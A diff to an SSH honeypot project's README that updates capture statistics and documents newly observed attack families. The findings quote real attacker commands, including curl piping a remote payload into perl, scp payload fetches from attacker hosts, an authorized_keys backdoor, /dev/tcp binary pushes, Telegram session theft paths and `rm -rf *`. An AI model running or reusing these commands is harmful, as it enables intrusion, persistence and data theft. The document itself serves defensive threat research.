@@ -16,17 +16,21 @@ payload captured: a Raspberry Pi SSH worm, plus binaries from the ELF echo injec
 Looking back, the "low interaction" label no longer fits. The SCP wire protocol, the
 stateful virtual FS, working pipes, and arithmetic expansion are all solidly medium.
 
-## findings (1546+ hours, Helsinki VPS)
+## findings (2144+ hours, Helsinki VPS)
 
 Full analysis in [FINDINGS.md](FINDINGS.md).
 
-105980 auth attempts from 2397 source IPs. 103192 sessions accepted. 15 attack families identified.
+190862 auth attempts from 3069 source IPs. 188073 sessions accepted. 22 attack families identified.
 Almost all clients identify as `SSH-2.0-Go` -- mass scanners built on the Go SSH library.
 
-Latest pull (Jul 27): +2915 attempts and sessions in ~180h, this time spread at baseline --
-no single-IP mega-spike (unlike Jul 14 and Jul 18). The all-time top sprayers
-(`165.227.238.235`, `161.97.166.185`) are carry-over, not new activity; +138 unique IPs.
-Commands crossed 9.77M, still 99.5% ELF echo injector (F10). See FINDINGS.md.
+Latest pull (Aug 23): +84882 attempts in ~598h, the biggest window so far -- ~3400/day
+against ~1650/day before. Two single days carry most of it (Aug 3: 50905 attempts,
+Aug 19: 23835). +672 unique IPs. Commands crossed 14.3M. Seven new families. Three are new
+traffic, all first seen in August, and all three avoid `wget | sh`: one pipes to **perl**,
+one pulls its payload over **scp** using a private key it ships itself, one drops an
+**SSH public key** into `authorized_keys` and installs no payload at all. The other four
+came out of grouping every session by its exact command sequence -- they were always in the
+logs, just too low-volume to notice. See FINDINGS.md.
 
 Two things worth separating: 87% of attempts target `user=root` and 89% carry the
 `SSH-2.0-Go` banner -- this is almost entirely automated Go scanners aimed at root.
@@ -112,11 +116,50 @@ SSH-2.0-OpenSSH_9.9 (only real OpenSSH in the dataset). One session June 12, sou
 185.129.62.63. Real payload never came. Quarantine hashes: e374a7ad (512B), f74a8b06 (348B).
 
 **15. SSH liveness/capability probe** -- `echo -e "\x6F\x6B"` (decodes to "ok"), standalone
-single command, no recon, no follow-up observed. 14954 sessions (66.3% of all sessions),
-3 source IPs, 98.9% from one IP (103.105.67.170). Zero cross-cluster overlap -- never
+single command, no recon, no follow-up observed. Now **139336 sessions** (95% of every
+session that ran a command), still 8 source IPs. Zero cross-cluster overlap -- never
 combined with any other named family. Likely confirming exec-channel works before making
 a decision externally. Plan: improve bait response and add follow-up detection to see if
 that IP ever returns after the beacon.
+
+**16. perl dropper** -- `curl -sS 154.70.152.216/zed | perl`, backgrounded, then
+`export HOME=/dev/null` so nothing lands in a home dir. Pipes to **perl**, not `sh` --
+detection rules grepping for `| sh` never fire. 478 sessions from 186 IPs in three days
+(Aug 20-23), the fastest-spreading family in the dataset and still ramping at pull time.
+
+**17. authorized_keys injector** -- `mkdir -p /root/.ssh && echo 'ssh-rsa AAAA...'`. No
+binary, no cron, no process. Adds a line to a file that is supposed to have lines in it,
+then leaves. 52 sessions, 37 IPs, one 4-hour burst on Aug 17, same public key every time
+(so one operator). Converts password access into key access with nothing left running to
+detect.
+
+**18. SSH key + scp transport** -- carries family 5's exact `auth_ok` beacon but replaces
+fileless `wget|sh` with: write an ed25519 **private** key to disk, disable host-key
+checking, `scp` the payload from `dlr@217.60.195.113`, HTTP only as fallback. Outbound scp
+on port 22 looks like an admin copying a file. 375 sessions, 4 IPs, running since Jun 10;
+switched C2 from `14.46.136.77` on Jun 13.
+
+**19. MikroTik / Telegram / SMS gateway hunter** -- `/ip cloud print` (RouterOS), then hunts
+`TelegramDesktop/tdata` and the `D877F783D5D3EF8C` key file, GSM modem nodes
+(`/dev/ttyGSM*`, `qmuxd`) and smstools paths. Steals logged-in Telegram sessions and looks
+for SMS-sending hardware -- reads like OTP interception. No payload, ever. 6 sessions,
+3 IPs, and the only family not using the Go SSH library.
+
+**20. busybox IoT probe** -- `/bin/busybox TEST`, `cat /proc`, `./`. All three deliberately
+error; it fingerprints by *error message*, the Mirai loader pattern. 19 sessions, 7 IPs.
+Never advanced to payload because the honeypot does not reproduce busybox's exact error
+strings -- a capture gap, not an absence.
+
+**21. dd + /dev/tcp binary push** -- bash's `/dev/tcp` builtin used as an HTTP client (no
+curl, no wget, nothing on disk), then `dd bs=1 count=1911588` pushing a 1.9 MB UPX-packed
+ELF straight down the SSH channel. Same goal as family 10's echo injection, one command
+instead of 43000. 1 session.
+
+**22. Recon variants** -- three low-volume patterns: a bot that `apt install`s its own
+missing tooling before inventorying the host and geolocating it via `ipinfo.io`; a
+capability scanner doing `command -v` sweeps for docker/gcc/mysql/redis; and
+`handshakebins.sh`, which tries five fetch methods including TFTP twice and then runs
+`rm -rf *`.
 
 ---
 
